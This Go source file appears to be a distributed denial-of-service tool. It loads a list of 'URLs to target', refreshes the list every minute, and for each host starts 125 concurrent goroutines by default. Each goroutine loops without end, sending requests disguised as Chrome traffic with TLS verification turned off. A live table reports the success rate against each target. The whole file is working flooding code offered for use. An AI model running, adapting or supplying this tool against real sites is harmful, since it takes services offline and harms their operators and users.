package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/rodaine/table"
	"net"
	"net/http"
	"net/url"
	"os"
	"sort"
	"sync"
	"time"
)

var (
	parallelism = flag.Int("p", 125, "number of concurrent connections per host")
	urlsFile    = flag.String("u", "urls", "file with URLs to target")
	debug       = flag.Bool("d", false, "debug mode")
)

const timeout = 90 * time.Second

var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		Dial: (&net.Dialer{
			Timeout:   timeout,
			KeepAlive: timeout,
		}).Dial,
		MaxIdleConns:          1000,
		IdleConnTimeout:       timeout,
		TLSHandshakeTimeout:   timeout,
		ExpectContinueTimeout: timeout,
	},
	Timeout: timeout,
}

var (
	mtx     = &sync.Mutex{}
	success = make(map[string]int)
	fail    = make(map[string]int)
	urls    = []string{}
)

func send(ctx context.Context, wg *sync.WaitGroup, req *http.Request) {
	for {
		select {
		case <-ctx.Done():
			wg.Done()
			return
		default:
			resp, err := client.Do(req)
			if err != nil {
				if *debug {
					fmt.Fprint(os.Stderr, err, "\n")
				}
				mtx.Lock()
				fail[req.URL.String()]++
				mtx.Unlock()
				continue
			}
			if resp.Body == nil {
				if *debug {
					fmt.Fprint(os.Stderr, err, "\n")
				}
				mtx.Lock()
				fail[req.URL.String()]++
				mtx.Unlock()
				continue
			}
			resp.Body.Close()

			mtx.Lock()
			success[req.URL.String()]++
			mtx.Unlock()
		}
	}
}

func probe(ctx context.Context, wg *sync.WaitGroup, address string, parallelism int) int {
	url, err := url.Parse(address)
	if err != nil {
		fmt.Fprint(os.Stderr, err, "\n")
	}

	req := Chrome
	req.URL = url
	for i := 0; i < parallelism; i++ {
		go send(ctx, wg, req.WithContext(ctx))
	}

	return parallelism
}

func report(ctx context.Context, wg *sync.WaitGroup) {
	for {
		select {
		case <-ctx.Done():
			wg.Done()
			return
		default:
			time.Sleep(10 * time.Second)
			fmt.Print("\033[H\033[2J")
			mtx.Lock()
			tbl := table.New("URL", "Success (%)", "Sent", "|", "URL", "Success (%)", "Sent")

			keys := make([]string, 0)
			for k := range success {
				keys = append(keys, k)
			}
			sort.Strings(keys)

			total := 0

			for i := 0; i < len(keys); i += 2 {
				total1 := success[keys[i]] + fail[keys[i]]
				total += total1
				rate1 := fmt.Sprintf("%.2f", 100.0*float64(success[keys[i]])/float64(total1))
				if i+1 == len(keys) {
					tbl.AddRow(keys[i], rate1, total1, "|", "", "", "")
					continue
				}
				total2 := success[keys[i+1]] + fail[keys[i+1]]
				total += total2
				rate2 := fmt.Sprintf("%.2f", 100.0*float64(success[keys[i+1]])/float64(total2))
				tbl.AddRow(keys[i], rate1, total1, "|", keys[i+1], rate2, total2)
			}
			mtx.Unlock()

			tbl.Print()
			fmt.Printf("\nURLs in DB: %d. Requests sent: %d\n", len(urls), total)
		}
	}
}

func readURLs() []string {
	f, err := os.Open(*urlsFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "can't open file: %v", err)
	}
	sc := bufio.NewScanner(f)
	urls := make([]string, 0)
	for sc.Scan() {
		urls = append(urls, sc.Text())
	}
	return urls
}

func main() {
	flag.Parse()

	ctx, cancel := context.WithCancel(context.Background())
	wg := &sync.WaitGroup{}

	for {
		newURLs := FetchURLs()
		if Checksum(urls) != Checksum(newURLs) {
			cancel()
			wg.Wait()

			ctx, cancel = context.WithCancel(context.Background())
			urls = newURLs
			for _, u := range urls {
				wg.Add(probe(ctx, wg, u, *parallelism))
			}

			go report(ctx, wg)
			wg.Add(1)
		}
		time.Sleep(1 * time.Minute)
	}
}
